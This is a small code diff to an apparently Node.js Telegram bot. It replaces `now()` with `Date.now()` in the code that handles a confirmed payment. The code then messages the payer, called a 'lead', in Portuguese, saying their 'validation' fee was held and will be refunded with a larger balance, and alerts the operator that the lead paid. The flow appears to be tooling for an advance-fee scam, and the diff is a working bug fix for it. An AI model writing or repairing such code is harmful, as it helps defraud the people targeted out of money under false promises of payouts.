@@ -402,7 +402,7 @@ async function startTelegramPolling() {
 
             if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
               const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\nO valor de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado e será reembolsado junto ao saldo total de *R$ ${parseFloat(total).toFixed(2)}* em instantes.`;
-              fs.writeFileSync(`cmd-send-${now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
+              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
               await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}`);
             } else {
               await sendTelegram(`⏳ <b>AGUARDANDO:</b> O lead ainda não pagou.`);
